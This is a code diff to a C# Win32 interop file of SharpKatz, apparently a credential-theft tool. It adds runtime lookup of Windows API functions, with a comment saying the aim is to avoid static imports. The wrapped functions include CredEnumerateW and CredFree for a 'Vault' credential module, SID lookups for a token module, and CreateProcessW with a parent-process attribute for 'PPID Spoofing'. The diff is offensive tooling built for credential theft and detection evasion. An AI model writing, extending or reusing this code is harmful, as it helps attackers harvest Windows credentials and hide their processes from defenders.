@@ -284,6 +284,16 @@ namespace SharpKatz.Win32
         }
 
         [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFOEX
+        {
+            public STARTUPINFO StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+
+        // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
+        public static readonly IntPtr PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = (IntPtr)0x00020000;
+
+        [StructLayout(LayoutKind.Sequential)]
         public struct TOKEN_STATISTICS
         {
             LUID TokenId;
@@ -2570,6 +2580,64 @@ namespace SharpKatz.Win32
             IntPtr proc = GetProcAddress(GetKernel32(), "GetFileAttributesExW");
             SysCall.Delegates.GetFileAttributesExW GetFileAttributesExW = (SysCall.Delegates.GetFileAttributesExW)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.GetFileAttributesExW));
             return GetFileAttributesExW(lpFileName, fInfoLevelId, ref lpFileInformation);
+        }
+
+        // --- Dynamic resolution for Token and Vault modules (no static DllImport) ---
+
+        public static bool LookupAccountSidW(IntPtr lpSystemName, IntPtr Sid, IntPtr lpName, ref int cchName,
+            IntPtr ReferencedDomainName, ref int cchReferencedDomainName, ref int peUse)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), "LookupAccountSidW");
+            SysCall.Delegates.LookupAccountSidW LookupAccountSidW = (SysCall.Delegates.LookupAccountSidW)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LookupAccountSidW));
+            return LookupAccountSidW(lpSystemName, Sid, lpName, ref cchName, ReferencedDomainName, ref cchReferencedDomainName, ref peUse);
+        }
+
+        public static bool ConvertSidToStringSidW(IntPtr Sid, ref IntPtr StringSid)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), "ConvertSidToStringSidW");
+            SysCall.Delegates.ConvertSidToStringSidW ConvertSidToStringSidW = (SysCall.Delegates.ConvertSidToStringSidW)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ConvertSidToStringSidW));
+            return ConvertSidToStringSidW(Sid, ref StringSid);
+        }
+
+        public static IntPtr LocalFree(IntPtr hMem)
+        {
+            IntPtr proc = GetProcAddress(GetKernel32(), "LocalFree");
+            SysCall.Delegates.LocalFree LocalFree = (SysCall.Delegates.LocalFree)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LocalFree));
+            return LocalFree(hMem);
+        }
+
+        public static bool CredEnumerateW(string filter, int flags, ref int count, ref IntPtr credentials)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), "CredEnumerateW");
+            SysCall.Delegates.CredEnumerateW CredEnumerateW = (SysCall.Delegates.CredEnumerateW)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.CredEnumerateW));
+            return CredEnumerateW(filter, flags, ref count, ref credentials);
+        }
+
+        public static void CredFree(IntPtr buffer)
+        {
+            IntPtr proc = GetProcAddress(GetAdvapi32(), "CredFree");
+            SysCall.Delegates.CredFree CredFree = (SysCall.Delegates.CredFree)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.CredFree));
+            CredFree(buffer);
+        }
+
+        // --- Dynamic resolution for PPID Spoofing ---
+
+        public static bool CreateProcessW(string lpApplicationName, string lpCommandLine,
+            ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
+            bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
+            string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
+        {
+            IntPtr proc = GetProcAddress(GetKernel32(), "CreateProcessW");
+            SysCall.Delegates.CreateProcessW CreateProcessW = (SysCall.Delegates.CreateProcessW)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.CreateProcessW));
+            return CreateProcessW(lpApplicationName, lpCommandLine, ref lpProcessAttributes, ref lpThreadAttributes,
+                bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, ref lpStartupInfo, out lpProcessInformation);
+        }
+
+        public static void DeleteProcThreadAttributeList(IntPtr lpAttributeList)
+        {
+            IntPtr proc = GetProcAddress(GetKernel32(), "DeleteProcThreadAttributeList");
+            SysCall.Delegates.DeleteProcThreadAttributeList DeleteProcThreadAttributeList = (SysCall.Delegates.DeleteProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.DeleteProcThreadAttributeList));
+            DeleteProcThreadAttributeList(lpAttributeList);
         }
     }
 }
